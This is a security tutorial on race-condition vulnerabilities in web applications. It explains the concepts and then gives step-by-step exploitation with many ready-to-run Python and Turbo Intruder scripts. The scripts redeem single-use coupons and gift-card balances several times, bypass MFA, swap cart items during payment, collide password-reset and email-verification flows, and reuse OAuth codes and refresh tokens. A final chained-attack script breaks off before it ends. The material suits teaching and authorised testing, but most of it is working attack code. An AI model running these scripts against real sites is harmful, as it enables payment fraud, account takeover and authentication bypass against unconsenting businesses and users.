## Race Conditions Vulnerabilities

- **What race conditions are**
  - Vulnerabilities that occur when concurrent processes interact with the same data simultaneously
  - Time-based flaws where the outcome depends on the sequence and timing of operations
  - Result from inadequate synchronization mechanisms in application code
  - Exploitation of temporary states during multi-step processing
  - Occur when applications process requests concurrently without proper safeguards
  - "Collisions" between distinct threads accessing the same data simultaneously
  - Manifestation of state inconsistency during request processing
  - Often centered around the concept of the "race window" - a period when exploitation is possible
  - Vulnerability class closely related to business logic flaws
  - Typically exploited through carefully timed multiple requests
  - A form of "time-of-check to time-of-use" (TOCTOU) vulnerability in many cases
  - Found in both single-endpoint and multi-endpoint scenarios
  - Present in web applications, APIs, and distributed systems

- **How vulnerabilities arise**
  - Lack of proper locking mechanisms on shared resources
  - Missing or inadequate transaction control in databases
  - Failure to implement atomic operations for state changes
  - Inconsistent session handling during multi-step processes
  - Background processing without proper synchronization
  - Reliance on client-side timing for security-critical operations
  - Improper validation sequences with separate check and use operations
  - Stateless architecture that relies on distributed data storage
  - Multi-threaded server environments without thread safety mechanisms
  - Poor implementation of rate limiting or quota enforcement
  - Asynchronous processing without proper state tracking
  - Complex application workflows with multiple sub-states
  - Microservice architectures with independent state management
  - Overreliance on application-level controls rather than database constraints

- **Impact**
  - Bypassing business logic constraints
  - Multiple usage of single-use resources (coupons, gift cards, etc.)
  - Financial impact through duplicate transactions or balance manipulation
  - Authentication and authorization bypass
  - Rate limit circumvention
  - Multi-factor authentication (MFA) bypass
  - Account takeover through password reset manipulation
  - CAPTCHA bypass
  - Privilege escalation through parallel state transitions
  - API abuse beyond intended limitations
  - Data corruption or inconsistency
  - Service disruption or denial of service (DoS)
  - Fraud in financial applications
  - Information disclosure through timing attacks
  - Integrity violations in critical data

- **Types of race conditions**

  - **Limit overrun race conditions**
    - Exploitation of the temporary state between checking and updating a counter
    - Manipulating application limits by sending parallel requests
    - Common examples:
      - Multiple redemption of single-use codes
      - Exceeding account balance in withdrawals
      - Bypassing rate limiting on critical operations
      - Reusing one-time tokens or CAPTCHA solutions
      - Multiple submissions of forms that should only be submitted once
    - Result in the violation of business constraints and limits
    - Often have direct financial impact or security implications
    - More easily detectable than other race condition types

  - **Hidden multi-step sequences**
    - Exploiting intermediate states in operations that appear atomic
    - Occurring within the processing timeline of a single request
    - Targeting invisible "sub-states" that the application enters and exits
    - Much harder to detect than simple limit overruns
    - Require deeper understanding of application's internal processing
    - Often tied to complex business logic implementations
    - Examples:
      - Authentication bypass during MFA enforcement
      - Payment validation bypass during order processing
      - Privilege escalation during account updates
      - Password reset token manipulation

  - **Multi-endpoint race conditions**
    - Involve concurrent requests to different application endpoints
    - Exploitation of shared state across distinct functionalities
    - More complex to identify and exploit due to timing challenges
    - Often require understanding of how different parts of the application interact
    - Examples:
      - Shopping cart manipulation during checkout
      - Account settings changes during authentication
      - Privilege modifications during role assignments

  - **Single-endpoint race conditions**
    - Concurrent requests with different parameters to the same endpoint
    - Often exploited for sensitive operations like password resets
    - Can lead to data leakage or unauthorized access
    - Particularly effective against email-based operations
    - Examples:
      - Password reset token manipulation
      - Email verification bypass
      - Profile update collisions

  - **Partial construction race conditions**
    - Targeting objects created in multiple steps
    - Exploiting temporary middle states during object initialization
    - Often combined with input injection targeting uninitialized states
    - Examples:
      - Account creation with uninitialized API keys
      - User registration with partial permission sets
      - Database record manipulation during multi-step creation

- **Identifying race conditions**
  - **Manual analysis approaches**:
    1. Map application functionality with focus on state-changing operations
    2. Identify operations with security implications
    3. Look for features with quantitative limits or validation checks
    4. Analyze multi-step processes for potential sub-states
    5. Review state-dependent security controls
    6. Focus on high-value targets (payments, authentication, etc.)
    7. Examine error messages that might indicate race condition protections
    
  - **The "predict, probe, prove" methodology**:
    1. **Predict** - Identify endpoints with collision potential
       - Focus on security-critical functionality
       - Look for operations that modify the same data/records
       - Prioritize single-use operations (codes, tokens)
       - Identify endpoints with explicit limits or validations
       
    2. **Probe** - Test for anomalies using parallel requests
       - Benchmark normal behavior with sequential requests
       - Send parallel requests using proper techniques
       - Look for any deviation from normal behavior
       - Check for inconsistent responses or errors
       - Monitor second-order effects (emails, application state)
       
    3. **Prove** - Refine the attack to demonstrate impact
       - Remove unnecessary requests
       - Identify the minimal steps to reproduce
       - Document the full exploit chain
       - Assess the maximum security impact
       - Create a reliable proof-of-concept

  - **Indicators of race condition vulnerabilities**:
    - Explicit counting or limiting functionality
    - Stateful multi-step workflows
    - References to uniqueness or "one-time" usage
    - Operations with financial implications
    - Security features with validation steps
    - Background processing of requests
    - Email-based verification flows
    - Rate limiting implementations
    - Error messages indicating concurrent access issues

- **Using Burp Suite for race condition testing**
  - **Burp Repeater for parallel requests**:
    1. Create multiple tabs with the target request
    2. Group the tabs (right-click → Add to group)
    3. Use "Send group in parallel" option to trigger the race condition
    4. Inspect responses for evidence of successful exploitation
    5. Adjust request parameters and timing as needed
    
  - **HTTP/2 single-packet attack**:
    1. Ensure target supports HTTP/2
    2. Create a group of requests in Burp Repeater
    3. Use "Send group in parallel" option
    4. Burp automatically uses single-packet attack for HTTP/2
    5. Multiple requests arrive simultaneously at the server
    6. Eliminates network jitter as a factor in timing
    
  - **Last-byte synchronization for HTTP/1**:
    1. Create a group of requests in Burp Repeater
    2. Use "Send group in parallel" option
    3. Burp automatically uses last-byte synchronization
    4. Reduces impact of network jitter
    5. Less effective than single-packet but still useful
    
  - **Turbo Intruder for advanced exploitation**:
    1. Install Turbo Intruder extension from BApp Store
    2. Right-click request and send to Turbo Intruder
    3. Select appropriate script template for race conditions
    4. Configure request count and concurrency settings
    5. Customize script for specific attack scenarios
    6. Execute attack and analyze results

- **Step-by-step exploitation techniques**

  - **Basic limit overrun exploitation**
    1. **Identifying vulnerable functionality**:
       - Step 1: Find features with quantitative limits or one-time use restrictions
       - Step 2: Analyze the validation mechanism (is it checking a database record?)
       - Step 3: Determine if validation and usage are separate operations
       - Step 4: Identify the race window between validation and state update
       - Step 5: Prepare multiple identical requests targeting the functionality
       - Example targets: coupon codes, gift cards, reward points, withdrawal limits
       - Example Python script for identifying limit-based endpoints:
       ```python
       import requests
       import re
       
       def find_potential_limit_endpoints(base_url, session):
           # Common paths that might contain limits
           paths_to_check = [
               "/cart", "/checkout", "/redeem", "/apply", "/withdraw",
               "/transfer", "/points", "/rewards", "/coupon", "/discount"
           ]
           
           potential_endpoints = []
           
           for path in paths_to_check:
               url = base_url + path
               response = session.get(url)
               
               # Look for indicators of limits in the response
               limit_indicators = [
                   "one[- ]time", "single use", "limit", "once", "maximum",
                   "exceeded", "balance", "available", "remaining"
               ]
               
               for indicator in limit_indicators:
                   if re.search(indicator, response.text, re.IGNORECASE):
                       potential_endpoints.append({
                           "url": url,
                           "indicator": indicator,
                           "status_code": response.status_code
                       })
                       break
           
           return potential_endpoints
       
       # Example usage
       session = requests.Session()
       session.headers = {"User-Agent": "Mozilla/5.0 ..."}
       results = find_potential_limit_endpoints("https://example.com", session)
       
       for endpoint in results:
           print(f"Potential limit endpoint: {endpoint['url']}")
           print(f"Indicator found: {endpoint['indicator']}")
           print(f"Status code: {endpoint['status_code']}")
           print("-" * 50)
       ```
    
    2. **Single-use discount code exploitation**:
       - Step 1: Identify a single-use discount code application endpoint
       - Step 2: Create a valid request that applies the discount code
       - Step 3: Prepare multiple identical copies of this request
       - Step 4: Send requests simultaneously using Burp Repeater or Turbo Intruder
       - Step 5: Check responses and cart/order state to verify multiple applications
       - Step 6: Complete the checkout process to confirm the exploit worked
       - Example Turbo Intruder script for discount code exploitation:
       ```python
       def queueRequests(target, wordlists):
           engine = RequestEngine(
               endpoint=target.endpoint,
               concurrentConnections=20,  # Adjust based on server capacity
               requestsPerConnection=1,
               pipeline=False
           )
           
           # Queue multiple identical requests
           for i in range(20):
               engine.queue(target.req, None)
       
       def handleResponse(req, interesting):
           # Look for successful responses
           if "discount applied" in req.response.lower() or "code accepted" in req.response.lower():
               table.add(req)
       ```
       
    3. **Gift card balance exploitation**:
       - Step 1: Identify the gift card redemption or usage endpoint
       - Step 2: Create a request that uses a gift card with remaining balance
       - Step 3: Prepare multiple identical copies of this request
       - Step 4: Send requests simultaneously using Burp Repeater or Turbo Intruder
       - Step 5: Check responses and account state to verify multiple redemptions
       - Step 6: Calculate the total value extracted compared to the card's actual balance
       - Example Python script using requests for gift card exploitation:
       ```python
       import requests
       import concurrent.futures
       
       def exploit_gift_card(url, card_number, card_pin, amount, session_cookie):
           headers = {
               "Content-Type": "application/x-www-form-urlencoded",
               "Cookie": f"session={session_cookie}"
           }
           
           data = {
               "card_number": card_number,
               "card_pin": card_pin,
               "amount": amount
           }
           
           response = requests.post(url, headers=headers, data=data)
           return response
       
       # Configuration
       target_url = "https://example.com/redeem-gift-card"
       gift_card = "1234567890123456"
       pin = "1234"
       redeem_amount = "50.00"  # Amount to redeem each time
       session = "abcdef123456789"
       threads = 10  # Number of parallel requests
       
       # Execute parallel requests
       with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
           futures = [
               executor.submit(exploit_gift_card, target_url, gift_card, pin, redeem_amount, session)
               for _ in range(threads)
           ]
           
           # Process results
           for future in concurrent.futures.as_completed(futures):
               try:
                   response = future.result()
                   print(f"Status: {response.status_code}")
                   print(f"Response: {response.text[:100]}...")
               except Exception as e:
                   print(f"Error: {e}")
       ```

  - **Multi-factor authentication (MFA) bypass**
    1. **Identifying vulnerable MFA implementation**:
       - Step 1: Analyze the MFA implementation flow
       - Step 2: Check if MFA enforcement happens as a separate step after initial authentication
       - Step 3: Identify requests that set session state and enforce MFA
       - Step 4: Look for authenticated endpoints that can be accessed after login but before MFA
       - Step 5: Prepare a test to send login and post-MFA requests simultaneously
       - Example vulnerability pattern:
       ```python
       # Pseudocode of vulnerable server-side implementation
       def login_handler():
           # Validate username and password
           if validate_credentials(request.username, request.password):
               # Set user as authenticated in session
               session['authenticated'] = True
               session['user_id'] = user.id
               
               # Check if MFA is required
               if user.mfa_enabled:
                   session['mfa_required'] = True
                   # Generate and send MFA code
                   send_mfa_code(user)
                   # Redirect to MFA page
                   return redirect('/mfa-verification')
               else:
                   # No MFA required, redirect to dashboard
                   return redirect('/dashboard')
       ```
       
    2. **Exploiting MFA race condition**:
       - Step 1: Prepare a login request with valid credentials
       - Step 2: Identify a protected endpoint that requires full authentication
       - Step 3: Group both requests in Burp Repeater
       - Step 4: Send the requests in parallel
       - Step 5: Check if the protected endpoint request succeeds despite MFA being enabled
       - Step 6: If successful, explore other protected endpoints to determine the extent of access
       - Example Turbo Intruder script for MFA bypass:
       ```python
       def queueRequests(target, wordlists):
           engine = RequestEngine(
               endpoint=target.endpoint,
               concurrentConnections=2,
               requestsPerConnection=1,
               pipeline=False
           )
           
           # Request 1: Login request
           login_req = '''POST /login HTTP/2
       Host: vulnerable-website.com
       Content-Type: application/x-www-form-urlencoded
       Cookie: session=expired_session_id
       
       username=victim_user&password=valid_password'''
           
           # Request 2: Access protected page
           protected_req = '''GET /account/settings HTTP/2
       Host: vulnerable-website.com
       Cookie: session=expired_session_id'''
           
           # Queue both requests to execute simultaneously
           engine.queue(login_req, None, gate='race')
           engine.queue(protected_req, None, gate='race')
           
           # Open the gate to send all requests
           engine.openGate('race')
       
       def handleResponse(req, interesting):
           # Check if protected request was successful
           if "HTTP/2 200" in req.response and "/account/settings" in req.request:
               table.add(req)
       ```

  - **Payment validation exploitation**
    1. **Identifying vulnerable payment process**:
       - Step 1: Map the complete checkout flow
       - Step 2: Identify the payment validation and order confirmation steps
       - Step 3: Check if the basket/cart can be modified after payment validation starts
       - Step 4: Look for race windows between payment validation and order finalization
       - Step 5: Prepare a test scenario with low-value items in the cart
       - Example vulnerability pattern in checkout flow:
         1. User adds items to cart
         2. User proceeds to checkout
         3. Payment validation occurs
         4. Order is finalized and database updated
       
    2. **Exploiting payment race condition**:
       - Step 1: Add a low-value item to your cart
       - Step 2: Begin the checkout process
       - Step 3: Prepare payment submission request
       - Step 4: Prepare cart modification request to add high-value items
       - Step 5: Send payment request
       - Step 6: Immediately send cart modification request
       - Step 7: Check if the order is completed with the high-value items at the low price
       - Example request sequence:
       ```
       # Request 1: Submit payment for low-value cart
       POST /checkout/process-payment HTTP/2
       Host: vulnerable-website.com
       Content-Type: application/json
       Cookie: session=valid_session_id
       
       {"payment_method":"credit_card","card_number":"4111111111111111","expiry":"12/23","cvv":"123"}
       
       # Request 2: Modify cart to add expensive items
       POST /cart/update HTTP/2
       Host: vulnerable-website.com
       Content-Type: application/json
       Cookie: session=valid_session_id
       
       {"items":[{"product_id":"expensive-item-1","quantity":1},{"product_id":"expensive-item-2","quantity":1}]}
       ```
       - Python script for payment validation exploitation:
       ```python
       import requests
       import time
       import threading
       
       def process_payment(session, url, payment_data):
           response = session.post(url, json=payment_data)
           return response
       
       def update_cart(session, url, cart_data):
           response = session.post(url, json=cart_data)
           return response
       
       # Set up session
       session = requests.Session()
       session.headers = {
           "User-Agent": "Mozilla/5.0 ...",
           "Content-Type": "application/json"
       }
       
       # Login and set up session
       login_response = session.post(
           "https://vulnerable-website.com/login",
           json={"username": "test_user", "password": "password123"}
       )
       
       # Add cheap item to cart first
       cheap_item = session.post(
           "https://vulnerable-website.com/cart/update",
           json={"items": [{"product_id": "cheap-item", "quantity": 1}]}
       )
       
       # Prepare payment data
       payment_data = {
           "payment_method": "credit_card",
           "card_number": "4111111111111111",
           "expiry": "12/23",
           "cvv": "123"
       }
       
       # Prepare expensive cart update
       expensive_items = {
           "items": [
               {"product_id": "expensive-item-1", "quantity": 1},
               {"product_id": "expensive-item-2", "quantity": 1}
           ]
       }
       
       # Execute payment request in a thread
       payment_thread = threading.Thread(
           target=process_payment,
           args=(session, "https://vulnerable-website.com/checkout/process-payment", payment_data)
       )
       
       # Start payment processing
       payment_thread.start()
       
       # Small delay to ensure payment processing has started but not completed
       time.sleep(0.1)
       
       # Update cart with expensive items during payment processing
       cart_response = update_cart(session, "https://vulnerable-website.com/cart/update", expensive_items)
       
       # Wait for payment thread to complete
       payment_thread.join()
       
       # Check order status
       order_status = session.get("https://vulnerable-website.com/order/status")
       print(f"Order status: {order_status.status_code}")
       print(f"Order details: {order_status.text[:200]}")
       ```

  - **Single-endpoint race conditions**
    1. **Password reset token manipulation**:
       - Step 1: Identify the password reset functionality
       - Step 2: Analyze how reset tokens are generated and stored
       - Step 3: Prepare two password reset requests for different accounts
       - Step 4: Send the requests simultaneously to create a collision
       - Step 5: Check if the system generates the same token or mixes the target accounts
       - Step 6: Attempt to use the token to reset the victim's password
       - Example Turbo Intruder script for password reset race condition:
       ```python
       def queueRequests(target, wordlists):
           engine = RequestEngine(
               endpoint=target.endpoint,
               concurrentConnections=2,
               requestsPerConnection=1,
               pipeline=False
           )
           
           # Request for your account
           your_reset_req = '''POST /reset-password HTTP/2
       Host: vulnerable-website.com
       Content-Type: application/x-www-form-urlencoded
       
       email=your-email@example.com'''
           
           # Request for victim's account
           victim_reset_req = '''POST /reset-password HTTP/2
       Host: vulnerable-website.com
       Content-Type: application/x-www-form-urlencoded
       
       email=victim@example.com'''
           
           # Queue both requests to execute simultaneously
           engine.queue(your_reset_req, None, gate='race')
           engine.queue(victim_reset_req, None, gate='race')
           
           # Open the gate to send all requests
           engine.openGate('race')
       
       def handleResponse(req, interesting):
           # Look for responses containing reset tokens or confirmation messages
           if "reset" in req.response.lower() and "token" in req.response.lower():
               table.add(req)
       ```
       
    2. **Email verification collisions**:
       - Step 1: Identify email verification or confirmation functionality
       - Step 2: Prepare two email change requests (one for attacker, one for victim)
       - Step 3: Send the requests simultaneously
       - Step 4: Check emails received to identify if tokens were mixed up
       - Step 5: Use any token sent to your email to verify the victim's email change
       - Example Python script for email verification race condition:
       ```python
       import requests
       import threading
       
       def change_email(session, url, email, thread_name):
           print(f"[{thread_name}] Sending email change request")
           response = session.post(
               url,
               json={"email": email}
           )
           print(f"[{thread_name}] Response: {response.status_code}")
           print(f"[{thread_name}] Response body: {response.text[:100]}")
           return response
       
       # Set up session with authentication
       session = requests.Session()
       session.headers = {
           "User-Agent": "Mozilla/5.0 ...",
           "Content-Type": "application/json",
           "Authorization": "Bearer valid_token_here"
       }
       
       # Target URL
       url = "https://vulnerable-website.com/account/change-email"
       
       # Email addresses
       your_email = "your-email@example.com"
       victim_email = "victim@example.com"
       
       # Create threads for simultaneous requests
       thread1 = threading.Thread(
           target=change_email,
           args=(session, url, your_email, "Thread-1")
       )
       
       thread2 = threading.Thread(
           target=change_email,
           args=(session, url, victim_email, "Thread-2")
       )
       
       # Start threads simultaneously
       thread1.start()
       thread2.start()
       
       # Wait for both threads to complete
       thread1.join()
       thread2.join()
       
       print("Email change requests completed")
       ```

  - **Partial construction race conditions**
    1. **API key initialization exploitation**:
       - Step 1: Identify user account creation or API key generation functionality
       - Step 2: Analyze how API keys are initialized (are they set in a separate step?)
       - Step 3: Prepare account creation or API key generation request
       - Step 4: Prepare API request that uses the API key for authentication
       - Step 5: Send account creation request
       - Step 6: Immediately send API request with an empty API key or predictable uninitialized value
       - Step 7: Check if the API request is accepted despite using an invalid key
       - Example Burp Repeater setup:
         1. Tab 1: Account creation request
         2. Tab 2: API request with empty API key or array parameter
         3. Group tabs and send in parallel
       - Example request sequence:
       ```
       # Request 1: Create new account or generate API key
       POST /account/create HTTP/2
       Host: vulnerable-website.com
       Content-Type: application/json
       
       {"username":"test_user","email":"test@example.com","password":"password123"}
       
       # Request 2: API request with empty key
       GET /api/user/data HTTP/2
       Host: vulnerable-website.com
       Authorization: Bearer 
       
       # Or with array notation (PHP/Rails)
       GET /api/user/data?api-key[]= HTTP/2
       Host: vulnerable-website.com
       ```
       
    2. **Uninitialized object exploitation**:
       - Step 1: Identify multi-step object creation processes
       - Step 2: Analyze how objects are constructed and what default values might exist
       - Step 3: Prepare object creation request
       - Step 4: Prepare object access request with parameter values matching expected defaults
       - Step 5: Send the requests in a race condition pattern
       - Step 6: Check if access is granted using default/uninitialized values
       - Example Python script for testing uninitialized object exploitation:
       ```python
       import requests
       import threading
       import time
       
       def create_object(session, url, data):
           response = session.post(url, json=data)
           return response
       
       def access_object(session, url, params):
           # Small delay to ensure first request has started but not completed
           time.sleep(0.05)
           response = session.get(url, params=params)
           return response
       
       # Set up session
       session = requests.Session()
       session.headers = {
           "User-Agent": "Mozilla/5.0 ...",
           "Content-Type": "application/json"
       }
       
       # Login first if needed
       login_response = session.post(
           "https://vulnerable-website.com/login",
           json={"username": "test_user", "password": "password123"}
       )
       
       # Object creation data
       create_data = {
           "object_name": "test_object",
           "object_type": "document",
           "description": "Test description"
       }
       
       # Values to test for uninitialized properties
       default_values = [
           "",                   # Empty string
           None,                 # Null
           [],                   # Empty array
           {},                   # Empty object
           0,                    # Zero
           "0",                  # String zero
           "null",               # String null
           "undefined"           # String undefined
       ]
       
       # Test each potential default value
       for value in default_values:
           print(f"Testing default value: {value}")
           
           # Start object creation in a thread
           create_thread = threading.Thread(
               target=create_object,
               args=(session, "https://vulnerable-website.com/objects/create", create_data)
           )
           create_thread.start()
           
           # Attempt to access with potential default value
           access_response = access_object(
               session, 
               "https://vulnerable-website.com/objects/access", 
               {"key": value}
           )
           
           # Wait for creation thread to complete
           create_thread.join()
           
           print(f"Access response with '{value}': {access_response.status_code}")
           print(f"Response body: {access_response.text[:100]}")
           print("-" * 50)
       ```

  - **Time-sensitive attacks**
    1. **Timestamp-based token prediction**:
       - Step 1: Analyze how security tokens are generated
       - Step 2: Test if tokens show patterns related to time
       - Step 3: Collect multiple tokens and analyze their structure
       - Step 4: If timestamp-based, prepare to generate tokens for simultaneous requests
       - Step 5: Send multiple requests at precise timing intervals
       - Step 6: Compare generated tokens to identify patterns
       - Step 7: Predict tokens for other users based on the timestamp pattern
       - Example Python script for timestamp token analysis:
       ```python
       import requests
       import time
       import hashlib
       import base64
       import threading
       
       def generate_token(session, url):
           timestamp = int(time.time())
           response = session.post(url)
           
           # Extract token from response
           token = extract_token_from_response(response)
           
           return {
               "timestamp": timestamp,
               "token": token
           }
       
       def extract_token_from_response(response):
           # Implement based on where the token appears in the response
           # This is just an example
           import re
           match = re.search(r'token=([a-zA-Z0-9_\-\.]+)', response.text)
           if match:
               return match.group(1)
           return None
       
       # Generate multiple tokens and analyze
       session = requests.Session()
       tokens = []
       
       # Generate 10 tokens with precise timing
       for i in range(10):
           token_data = generate_token(session, "https://vulnerable-website.com/generate-token")
           tokens.append(token_data)
           print(f"Token {i+1}: {token_data['token']}")
           print(f"Timestamp: {token_data['timestamp']}")
           print("-" * 50)
           
           # Wait 1 second between requests
           time.sleep(1)
       
       # Analyze potential timestamp encoding
       print("\nAnalyzing tokens...")
       for i in range(len(tokens)-1):
           # Try common encoding methods to see if tokens match timestamps
           t1 = tokens[i]
           t2 = tokens[i+1]
           
           # Test if token is direct timestamp encoding
           if t1['token'].startswith(str(t1['timestamp'])):
               print("Token appears to start with timestamp")
           
           # Test if token is hashed timestamp
           for hash_func in [hashlib.md5, hashlib.sha1, hashlib.sha256]:
               # Test with different formats
               for fmt in [
                   str(t1['timestamp']),
                   str(t1['timestamp'])[:8],
                   hex(t1['timestamp']),
               ]:
                   hashed = hash_func(fmt.encode()).hexdigest()
                   if t1['token'].startswith(hashed[:8]) or hashed.startswith(t1['token'][:8]):
                       print(f"Token may be {hash_func.__name__} hash of timestamp in format: {fmt}")
           
           # Test if token is base64 encoded timestamp
           try:
               decoded = base64.b64decode(t1['token'] + "==")
               if str(t1['timestamp']).encode() in decoded:
                   print("Token may be base64 encoded with timestamp")
           except:
               pass
       ```

  - **Using Turbo Intruder for race conditions**
    1. **Basic race condition script**:
       ```python
       def queueRequests(target, wordlists):
           engine = RequestEngine(
               endpoint=target.endpoint,
               concurrentConnections=20,  # Adjust based on target
               requestsPerConnection=1,
               pipeline=False
           )
           
           # Queue multiple identical requests
           for i in range(20):
               engine.queue(target.req, None)
       
       def handleResponse(req, interesting):
           # Analyze responses
           if interesting:
               table.add(req)
       ```
    
    2. **HTTP/2 single-packet attack**:
       ```python
       def queueRequests(target, wordlists):
           engine = RequestEngine(
               endpoint=target.endpoint,
               concurrentConnections=1,  # Must be 1 for single-packet
               engine=Engine.BURP2  # Use Burp2 engine for HTTP/2
           )
           
           # Queue requests in a gate for synchronized delivery
           for i in range(20):
               engine.queue(target.req, gate='race')
           
           # Open gate to send all requests in a single packet
           engine.openGate('race')
       
       def handleResponse(req, interesting):
           table.add(req)
       ```
    
    3. **Multi-endpoint race condition script**:
       ```python
       def queueRequests(target, wordlists):
           engine = RequestEngine(
               endpoint=target.endpoint,
               concurrentConnections=1,
               engine=Engine.BURP2
           )
           
           # First request (e.g., payment submission)
           req1 = '''POST /checkout/payment HTTP/2
       Host: vulnerable-website.com
       Content-Type: application/json
       Cookie: session=valid_session
       
       {"payment_method":"credit","amount":"10.00"}'''
           
           # Second request (e.g., cart modification)
           req2 = '''POST /cart/update HTTP/2
       Host: vulnerable-website.com
       Content-Type: application/json
       Cookie: session=valid_session
       
       {"items":[{"id":"expensive-item","quantity":5}]}'''
           
           # Queue both requests to the same gate
           engine.queue(req1, gate='race')
           engine.queue(req2, gate='race')
           
           # Send all requests in the gate simultaneously
           engine.openGate('race')
       
       def handleResponse(req, interesting):
           table.add(req)
       ```
    
    4. **Turbo Intruder with connection warming**:
       ```python
       def queueRequests(target, wordlists):
           engine = RequestEngine(
               endpoint=target.endpoint,
               concurrentConnections=1,
               engine=Engine.BURP2
           )
           
           # Warm-up request to establish connection
           warmup = '''GET / HTTP/2
       Host: vulnerable-website.com
       
       '''
           
           # Target requests
           attack_req = target.req
           
           # First, queue the warm-up request
           engine.queue(warmup)
           
           # Then queue attack requests in a gate
           for i in range(20):
               engine.queue(attack_req, gate='race')
           
           # Send attack requests after warm-up completes
           engine.openGate('race')
       
       def handleResponse(req, interesting):
           table.add(req)
       ```

  - **Cross-session race conditions**
    1. **Bypassing session-based locking mechanisms**:
       - Step 1: Identify if the application uses session-based locking
       - Step 2: Create multiple valid sessions for the same account
       - Step 3: Prepare identical requests using different session tokens
       - Step 4: Send the requests simultaneously
       - Step 5: Check if the requests are processed concurrently despite session locking
       - Example Python script for cross-session exploitation:
       ```python
       import requests
       import threading
       import time
       
       def login_and_get_session():
           session = requests.Session()
           response = session.post(
               "https://vulnerable-website.com/login",
               data={
                   "username": "test_user",
                   "password": "password123"
               }
           )
           return session
       
       def exploit_with_session(session, url, data, session_id):
           response = session.post(url, json=data)
           print(f"Session {session_id} response: {response.status_code}")
           print(f"Response body: {response.text[:100]}")
           return response
       
       # Create multiple sessions
       sessions = []
       num_sessions = 5
       
       for i in range(num_sessions):
           print(f"Creating session {i+1}")
           session = login_and_get_session()
           sessions.append(session)
       
       # Target endpoint
       target_url = "https://vulnerable-website.com/redeem-code"
       
       # Data for each request
       request_data = {
           "code": "ONETIME10",  # Single-use discount code
           "product_id": "12345"
       }
       
       # Create threads for parallel requests with different sessions
       threads = []
       for i, session in enumerate(sessions):
           thread = threading.Thread(
               target=exploit_with_session,
               args=(session, target_url, request_data, i+1)
           )
           threads.append(thread)
       
       # Start all threads simultaneously
       for thread in threads:
           thread.start()
       
       # Wait for all threads to complete
       for thread in threads:
           thread.join()
       
       print("Exploitation attempt completed")
       ```

  - **OAuth2 race conditions**
    1. **Authorization_code exploitation**:
       - Step 1: Set up a malicious OAuth application
       - Step 2: Have a user authorize your application
       - Step 3: Obtain the authorization code
       - Step 4: Prepare multiple token exchange requests using the same code
       - Step 5: Send token requests simultaneously
       - Step 6: Check if multiple valid tokens are issued for the same code
       - Example Turbo Intruder script for OAuth code reuse:
       ```python
       def queueRequests(target, wordlists):
           engine = RequestEngine(
               endpoint=target.endpoint,
               concurrentConnections=10,
               requestsPerConnection=1,
               pipeline=False
           )
           
           # Queue multiple identical token requests with the same auth code
           auth_code = "valid_authorization_code_here"
           
           for i in range(10):
               engine.queue(target.req.replace("AUTHORIZATION_CODE", auth_code), None)
       
       def handleResponse(req, interesting):
           # Look for successful token responses
           if "access_token" in req.response:
               table.add(req)
       ```
       
    2. **Refresh token exploitation**:
       - Step 1: Obtain a valid refresh token
       - Step 2: Prepare multiple token refresh requests
       - Step 3: Send refresh requests simultaneously
       - Step 4: Check if multiple new access tokens are issued
       - Step 5: Verify if tokens remain valid even after user revokes application access
       - Example Python script for refresh token exploitation:
       ```python
       import requests
       import threading
       
       def refresh_token(refresh_token, client_id, client_secret, thread_id):
           url = "https://oauth-provider.com/token"
           data = {
               "grant_type": "refresh_token",
               "refresh_token": refresh_token,
               "client_id": client_id,
               "client_secret": client_secret
           }
           
           response = requests.post(url, data=data)
           print(f"Thread {thread_id} status: {response.status_code}")
           
           if response.status_code == 200:
               try:
                   token_data = response.json()
                   print(f"Thread {thread_id} received new tokens:")
                   print(f"Access token: {token_data.get('access_token')[:10]}...")
                   print(f"Refresh token: {token_data.get('refresh_token')[:10]}...")
                   return token_data
               except:
                   print(f"Thread {thread_id} failed to parse JSON response")
           
           return None
       
       # OAuth app credentials
       refresh_token = "valid_refresh_token_here"
       client_id = "your_client_id"
       client_secret = "your_client_secret"
       
       # Number of parallel refresh attempts
       num_attempts = 5
       
       # Create threads for parallel requests
       threads = []
       results = []
       
       for i in range(num_attempts):
           thread = threading.Thread(
               target=lambda i=i: results.append(refresh_token(refresh_token, client_id, client_secret, i+1)),
               args=()
           )
           threads.append(thread)
       
       # Start all threads simultaneously
       for thread in threads:
           thread.start()
       
       # Wait for all threads to complete
       for thread in threads:
           thread.join()
       
       # Check unique tokens received
       unique_access_tokens = set()
       unique_refresh_tokens = set()
       
       for result in results:
           if result:
               if 'access_token' in result:
                   unique_access_tokens.add(result['access_token'])
               if 'refresh_token' in result:
                   unique_refresh_tokens.add(result['refresh_token'])
       
       print(f"\nExploit summary:")
       print(f"Unique access tokens: {len(unique_access_tokens)}")
       print(f"Unique refresh tokens: {len(unique_refresh_tokens)}")
       ```

- **Advanced exploitation techniques**
  1. **Chaining multiple race conditions**:
     - Identify multiple race condition vulnerabilities in the application
     - Determine how they can be combined for maximum impact
     - Create a coordinated attack script that exploits multiple vulnerabilities
     - Use the output from one race condition to feed into another
     - Example Python script for chained exploitation:
     ```python
     import requests
     import threading
     import time
     
     # Step 1: Create account with race condition to bypass email verification
     def create_account_with_bypass(username, email, password):
         session = requests.Session()
         
         # Prepare account creation request
         create_req = session.post(
             "https://vulnerable-website.com/account/create",
             json={
                 "username": username,
                 "email": email,
                 "password": password
             }
         )
         
         # Prepare request to access privileged function
         # that should require email verification
         access_req = session.get(
             "https://vulnerable-website.com/account/settings"
         )
         
         return session
     
     # Step 2: Use the verified account to exploit a coupon code race condition
     def exploit_coupon_code(session, code):
         successful = 0
         threads = []
         
         def apply_code():
             nonlocal successful
             response = session.post(
                 "https://vulnerable-website.com/apply-coupon",
                 json={"code": code}
             )
             if "success" in response.text.lower():
                 successful += 1
             return response
         
         # Send multiple parallel requests to apply the same code
         for i in range(5):
             thread = threading.Thread(target=apply_code)
             threads.append(thread)
             thread.start()
         
         # Wait for all threads
         for thread in threads:
             thread.join()
             
         return successful
     
     # Step 3: Exploit a payment race condition
     def exploit_payment_race(session, amount):
         # Prepare payment request
         payment_req = threading.Thread(
             target=lambda: session.post(
                 "https://vulnerable-website.com/process-payment",
                 json={"amount": amount}
             )
         )
         
         # Prepare cart modification request
         cart_req = threading.Thread(
             target=lambda: session.post(
                 "https://vulnerable-website.com/cart/update",
                 json={"items": [{"id": "expensive-item", "quantity": 10}]}
             )
         )
         
         # Start payment first
         payment_req.start()
         
         # Short delay
         time.sleep(0.05)
         
         # Modify cart during payment processing
         cart_req.start()
         
         # Wait for both to complete
         payment_req.join()
         cart_req.join()
         
         # Check order status
         order = session.get("https://vulnerable-website.com/order/status")
         return order
     
     # Execute full chain
